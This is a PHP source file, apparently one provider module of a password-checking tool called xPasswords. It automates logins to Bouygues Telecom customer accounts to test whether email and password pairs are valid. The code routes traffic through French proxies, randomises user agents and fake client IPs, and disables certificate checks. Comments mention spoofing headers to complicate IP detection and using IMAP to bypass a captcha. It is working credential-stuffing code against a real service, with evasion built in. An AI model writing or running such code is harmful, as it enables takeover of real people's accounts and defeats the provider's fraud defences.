<?php
namespace xPasswords\Providers;

class Bouygues {
    
    static public $imapAddress = 'imap://imap4.bbox.fr:143';
    
    // Use IMAP to bypass captcha
    static public function authenticate($email, $password) {
        
        // Shared options
        $staticOptions = [
            'CSRF' => false,
            'Cookie' => false,
            'UserAgent' => \xPasswords\Core::getUserAgent(),
            'UserIP' => '78.212.' . rand(0, 255) . '.' . rand(0, 255),
            'SocksIP' => \xPasswords\Core::getProxy('Europe/France'),
        ];

        // STEP 1: GET CSRF TOKEN AND COOKIES
        $request = \Requests::get('https://www.mon-compte.bouyguestelecom.fr/cas/login', [
            //'X-FORWARDED-FOR' => $staticOptions['UserIP'],
            //'VIA' => '1.0 squid:80 (squid/2.1.STABLE3)',
            'User-Agent' => $staticOptions['UserAgent'],
            
            'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language' => 'Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4',
            'Content-Type' => 'application/x-www-form-urlencoded',
            'Connection' => 'keep-alive',
            
            'Origin' => 'http://www.mon-compte.bouyguestelecom.fr',
        ], [
            'timeout' => 30, // Timeout
            'proxy' => $staticOptions['SocksIP'], // SOCKS Proxy
            'useragent' => $staticOptions['UserAgent'], // Random user-agent
            'follow_redirects' => false, // Don't follow redirections
            'verifyname' => false, // Do not verify SSL certificates
            'verify' => false, // Do not verify SSL certificates
        ]);
        
        // Parse Cookie var
        @preg_match('/bn=(.*?);(.*?)JSESSIONID=(.*?);/', $request->headers['Set-Cookie'], $staticOptions['Cookie']);
        if(empty($staticOptions['Cookie'])) {
            // Cookie empty
            echo \xPasswords\Core::say('[ERROR] [PROVIDER] Error while getting cookies.', ['color' => 'red']);
            return false;
        }
        $staticOptions['Cookie'] = 'bn=' . $staticOptions['Cookie'][1] . '; JSESSIONID=' . $staticOptions['Cookie'][3];
        
        // Prevent empty body
        $requestBody = trim($request->body);
        if(empty($requestBody)) {
           echo \xPasswords\Core::say('[ERROR] [PROVIDER] Error while getting body content.', ['color' => 'red']);
           return false;
        }
        
        // Parse CSRF var
        $domLoad = new \DomDocument();
        $domLoad->loadHTML(trim($request->body));
        $xp = new \DOMXpath($domLoad);
        $staticOptions['CSRF'] = $xp->query('//*[@id="log_cta"]/input[@name="lt"]')->item(0)->getAttribute('value');
        if(empty($staticOptions['CSRF'])) {
            // CSRF empty
            echo \xPasswords\Core::say('[ERROR] [PROVIDER] Error while getting CSRF token.', ['color' => 'red']);
            return false;
        }
        
        // Adding extra delay
        \xPasswords\Core::sleep(5);
        if(defined('_DEBUG_MODE')) echo \xPasswords\Core::say('[INFO] [PROVIDER] Step 1 passed', ['blue']);
        
        // STEP 2: SEND CREDENTIALS TO SERVER
        $request = \Requests::post('https://www.mon-compte.bouyguestelecom.fr/cas/login', [
            // Try to spoof and make the IP detection more complex
            //'X-FORWARDED-FOR' => $staticOptions['UserIP'],
            //'VIA' => '1.0 squid:80 (squid/2.1.STABLE3)',
            'User-Agent' => $staticOptions['UserAgent'],
            
            'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language' => 'Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4',
            'Content-Type' => 'application/x-www-form-urlencoded',
            'Connection' => 'keep-alive',
            
            'Referer' => 'http://www.mon-compte.bouyguestelecom.fr/cas/login',
            'Origin' => 'http://www.mon-compte.bouyguestelecom.fr',
            'Cookie' => $staticOptions['Cookie'],
        ], [
            'lt' => $staticOptions['CSRF'],
            '_eventId' => 'submit',
            'username' => $email,
            'password' => $password,
            'rememberMe' => false,
            '_rememberMe' => 'off',
            'execution' => 'e1s1',
        ], [
            'timeout' => 30, // 1 min timeout
            'proxy' => $staticOptions['SocksIP'], // SOCKS Proxy
            'useragent' => $staticOptions['UserAgent'], // Random user-agent
            'follow_redirects' => false, // Don't follow redirections
            'verifyname' => false, // Do not verify SSL certificates
            'verify' => false, // Do not verify SSL certificates
        ]);
        
        // Free memory
        $staticOptions = NULL;

        switch($request->status_code) {
            case 302: // Authorized
            // https://www.mon-compte.bouyguestelecom.fr/ecr/dispatch?ticket=
            if(preg_match('/^https:\/\/www.mon-compte.bouyguestelecom.fr\/ecr\/dispatch\?ticket=(.*?)$/iu', $request->headers['location'])) {
                return true;
            }
            // Error 500: http://www.espaceclient.bouyguestelecom.fr/content/cms/htmlT/page_bouchon.html
            // ??
            echo \xPasswords\Core::say('[ERROR] [PROVIDER] Bouygues returned anormal URL location: ' . $request->headers['location'] . ' for ' . $email, ['color' => 'red']);
            return false;
            break;

            case 200: // Unauthorized
            return false;
            break;

            default: echo \xPasswords\Core::say('[ERROR] [PROVIDER] Bouygues returned anormal HTTP code: ' . $request->status_code . ' for ' . $email, ['color' => 'red']);
            break;
        }
                
        return false;
    }
};